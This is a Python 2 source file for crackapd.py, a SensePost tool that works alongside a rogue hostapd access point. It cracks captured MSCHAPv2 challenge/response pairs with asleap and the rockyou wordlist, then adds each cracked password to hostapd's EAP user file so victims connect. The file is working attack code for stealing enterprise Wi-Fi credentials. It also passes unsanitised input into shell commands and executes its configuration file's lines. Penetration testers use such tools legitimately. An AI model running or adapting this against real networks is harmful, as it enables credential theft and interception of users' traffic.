#!/usr/bin/env python
# SensePost PythonTemplate
#
# Copyright (C) 2012 SensePost <ian@sensepost.com>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

# Imports.  We need:
#	Queue for work items
#	Lock for locking
#	Thread for threading
import Queue
import os.path
import os
from threading import Lock
from threading import Thread

# The lock object to prevent STDOUT from being confussed...
LOCK = Lock()

# Threadsafe Print Results function
def PrintResult(verbose, message):
	if (verbose > 0):
		LOCK.acquire()
		print message
		LOCK.release()

def WriteResult(s_file, s_string):
	LOCK.acquire()
	try:
		found = False
		datafile = file(s_file)
		for dataline in datafile:
			if s_string in dataline:
				found = True
				break
		
		if found == False:
			f = open(s_file, 'a')
			f.write(str(s_string) + "\n")
			f.close()
			s = str("pkill -SIGHUP hostapd")
			p = os.popen(s, "r")
			while 1:
				line = p.readline()
				if not line:
					break
	except:
		PrintResult(1, "Ermm,,,")
	LOCK.release()

# This is the worker thread section.
class GetIt(Thread):
	def __init__(self, verbose, s_queue, s_userfile, s_exec):
		Thread.__init__(self)
		self.the_verbose = verbose
		self.the_queue = s_queue
		self.the_user = s_userfile
		self.the_exec = s_exec

	def run(self):
		while 1:
			arr = self.the_queue.get()
			if arr is None:
				break
			self.response = ""
			# The thread will exit if it dequeues a None object.
			arr = str(arr).replace("\r", "").replace("\n", "")
			(t, u, c, r) = str(arr).split("|")
			if str(t) == "CHAP":
				s = str(self.the_exec) + " -C " + c + " -R " + r + " -W /root/rockyou.txt"
				p = os.popen(s, "r")
				while 1:
					line = p.readline()
					if not line:
						break
					line = str(line).replace("\r", "").replace("\n", "")
					if str(line).find("password:") > -1:
						(a, b) = str(line).split("password:          ")
						txt_pass = str(b)
						self.response = "\"" + u + "\"" + "\t" + "PEAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP\t" + "\"" + txt_pass + "\"\t" + "[2]"
				if str(self.response) != "":
					WriteResult(self.the_user, self.response)
			
			# Otherwise, it will print the string, and value dequeued.
			#WriteResult(self.the_user, self.response)
			#PrintResult(self.the_verbose, "OUTPUT FROM THREAD:" + self.response)
	
# *duh*  The main process entry...
if __name__ == '__main__':

	# Global Variables.  These get overwritten in config file...
	VERBOSE=1
	THREADS=10
	RUNFILE="/tmp/crackapd.run"
	HOSTAPD="/root/hostapd/etc/hostapd.conf"
	EAPUSER="/root/hostapd/etc/hostapd.eap_user"
	ENNODES="/root/ennode.node"
	CRACKEX="/usr/bin/asleap"

	# Global Variables.  These are calculated... :P
	WRKQUEUE = Queue.Queue()

	# Print a nice header...
	PrintResult(VERBOSE, "crackapd.py")
	PrintResult(VERBOSE, "Version 1.0")
	PrintResult(VERBOSE, "Copyright - SensePost (Pty) Ltd - 2014")
	PrintResult(VERBOSE, "Ian de Villiers <ian@sensepost.com>")
	PrintResult(VERBOSE, "")

	# Read Configuration Variables...
	PrintResult(VERBOSE, "")
	PrintResult(VERBOSE, "Loading Configuration...")
	try:
		s = open('crackapd.conf', 'r').readlines()
		for i in s:
			exec(i)
	except:
		PrintResult(VERBOSE, " ! Could not load configuration file.  Using defaults")
	PrintResult(VERBOSE, " + Loaded Configuration.")
	PrintResult(VERBOSE, " + Verbose               : " + str(VERBOSE))
	PrintResult(VERBOSE, " + Total Threads         : " + str(THREADS))
	PrintResult(VERBOSE, " + Control File          : " + str(RUNFILE))
	PrintResult(VERBOSE, " + HostAPD Configuration : " + str(HOSTAPD))
	PrintResult(VERBOSE, " + Crack Executable      : " + str(CRACKEX))
	PrintResult(VERBOSE, " + Done")
	PrintResult(VERBOSE, "")
	PrintResult(VERBOSE, "")
	PrintResult(VERBOSE, "Loading HostApd Configuration...")
	try:
		s = open(HOSTAPD, 'r').readlines()
		for i in s:
			if str(i).startswith("ennode"):
				(a, b) = str(i).split("=")
				if b is None:
					PrintResult(VERBOSE, " ! No Entry node specified. Using default")
				else:
					ENNODES = str(b).replace("\r", "").replace("\n", "")
					PrintResult(VERBOSE, " + Crack Entry Node      : " + str(ENNODES))
			if str(i).startswith("eap_user_file"):
				(a, b) = str(i).split("=")
				if b is None:
					PrintResult(VERBOSE, " ! No Entry node specified. Using default")
				else:
					EAPUSER = str(b).replace("\r", "").replace("\n", "")
					PrintResult(VERBOSE, " + EAP Users File        : " + str(EAPUSER))
	except:
		PrintResult(VERBOSE, " ! Could not read hostapd configuration. Using defaults")

	# Start the threads...
	PrintResult(VERBOSE, "Initialising Threads...")
	for i in range(THREADS):
		PrintResult(VERBOSE, " + Starting Thread..." + str(i))
		GetIt(VERBOSE, WRKQUEUE, EAPUSER, CRACKEX).start()
	PrintResult(VERBOSE, " + Done")
	PrintResult(VERBOSE, "")

	# Create the run file
	try:
		runfile = open(str(RUNFILE), 'a')
		runfile.write("1")
		runfile.close()
	except:
		PrintResult(VERBOSE, " ! Could not create run file. The program will exit")

	# We'll open the input FIFO here
	INPUTNODE = None
	try:
		PrintResult(VERBOSE, "Opening input FIFO...")
		INPUTNODE = open(ENNODES, 'r')
	except:
		INPUTNODE = None
		PrintResult(VERBOSE, " ! Could not open input FIFO. The program will exit")

	# We'll now enter the main loop. We check to see whether the runfile exists.
	# if it does, we continue processing.
	# If it does not, we exit and put None in the queues...
	while(os.path.isfile(RUNFILE)):
		if INPUTNODE == None:
			break
		s = INPUTNODE.readline()
		if str(s) != "":
			s = str(s).replace("\r", "").replace("\n", "")
			PrintResult(VERBOSE, "ITEM ADDED TO QUEUE " + str(s))
			WRKQUEUE.put(s)

	# If we reach this, the runfile has been removed. We exit.
	PrintResult(VERBOSE, "Run file has been removed. We're exiting now...")
	if INPUTNODE != None:
		INPUTNODE.close()
	
	# The threads will end when they receive a NONE from the queue.  We add a None for each thread.
	for i in range(THREADS):
		PrintResult(VERBOSE, "Clearing Threads")
		WRKQUEUE.put(None)
